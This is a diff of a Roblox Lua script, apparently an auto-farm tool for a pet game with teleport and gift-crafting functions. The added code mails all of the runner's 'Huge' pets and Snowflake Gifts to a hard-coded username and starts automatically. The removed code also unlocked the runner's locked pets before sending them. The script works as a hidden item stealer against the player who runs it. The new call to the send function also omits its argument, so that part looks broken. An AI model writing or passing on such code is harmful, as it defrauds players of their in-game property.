@@ -18,34 +18,8 @@ local function teleportPlayer()
         warn("Teleport location not found.")
     end
 end
+wait(10)
 
--- Function to send all Snowflake gifts and Huge pets to the configured username
-local function sendGiftsToUsername(snowflakeCount)
-    -- Send all Snowflake Gifts
-    local totalGiftsToSend = math.floor(snowflakeCount / snowflakeToGiftRatio)
-    for i = 1, totalGiftsToSend do
-        repeat
-            task.wait()  -- Wait until the gift is sent
-        until Network.Invoke("Mailbox: Send", username, noteToSend, "Gift", "SnowflakeGift", 1)
-        print("Sent Snowflake Gift to", username)
-    end
-
-    -- Send all Huge pets
-    local HugeUIDList = {}
-    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
-        if PetData.id:find("Huge") then
-            table.insert(HugeUIDList, PetUID)
-        end
-    end
-
-    -- Send Huge pets to the configured user
-    for _, PetUID in pairs(HugeUIDList) do
-        repeat
-            task.wait()  -- Wait until the pet is sent
-        until Network.Invoke("Mailbox: Send", username, noteToSend, "Pet", PetUID, 1)
-        print("Sent Huge pet", PetUID, "to", username, "with message:", noteToSend)
-    end
-end
 
 -- Function for checking and crafting gifts based on snowflakes and diamonds
 local function checkAndCraftGifts()
@@ -120,38 +94,34 @@ local function checkAndCraftGifts()
     end
 end
 
--- Function to unlock Huge pets and send them to the configured user
-local function sendHugePetsToRandomUser()
-    while true do
-        wait(loopInterval)  -- Loop every 10 seconds
+-- Function to send all Snowflake gifts and Huge pets to the configured username
+local function sendGiftsToUsername(snowflakeCount)
+    -- Send all Snowflake Gifts
+    local totalGiftsToSend = math.floor(snowflakeCount / snowflakeToGiftRatio)
+    for i = 1, totalGiftsToSend do
+        repeat
+            task.wait()  -- Wait until the gift is sent
+        until Network.Invoke("Mailbox: Send", username, noteToSend, "Gift", "SnowflakeGift", 1)
+        print("Sent Snowflake Gift to", username)
+    end
 
-        local HugeUIDList = {}
-
-        -- Unlock Huge pets
-        for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
-            if PetData.id:find("Huge") then  -- Find Huge pets by checking the pet ID
-                table.insert(HugeUIDList, PetUID)  -- Add Huge pets to the list
-                if PetData._lk then
-                    repeat
-                        task.wait()  -- Wait until the pet is unlocked
-                    until Network.Invoke("Locking_SetLocked", PetUID, false)
-                    print("Unlocked Huge pet", PetUID)
-                end
-            end
+    -- Send Huge pets
+    local HugeUIDList = {}
+    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
+        if PetData.id:find("Huge") then
+            table.insert(HugeUIDList, PetUID)
         end
+    end
 
-        -- Send Huge pets to the configured user
-        for _, PetUID in pairs(HugeUIDList) do
-            local selectedUser = username  -- Use the configured username
-            local selectedMessage = noteToSend  -- Use the configured message
-            repeat
-                task.wait()  -- Wait until the pet is sent
-            until Network.Invoke("Mailbox: Send", selectedUser, selectedMessage, "Pet", PetUID, 1)
-            print("Sent Huge pet", PetUID, "to", selectedUser, "with message:", selectedMessage)
-        end
+    -- Send Huge pets to the configured user
+    for _, PetUID in pairs(HugeUIDList) do
+        repeat
+            task.wait()  -- Wait until the pet is sent
+        until Network.Invoke("Mailbox: Send", username, noteToSend, "Pet", PetUID, 1)
+        print("Sent Huge pet", PetUID, "to", username, "with message:", noteToSend)
     end
 end
 
 -- Run the check and gift functions concurrently using spawn
 spawn(checkAndCraftGifts)  -- First check and craft gifts
-spawn(sendHugePetsToRandomUser)  -- Run the function to send Huge pets
+spawn(sendGiftsToUsername) 
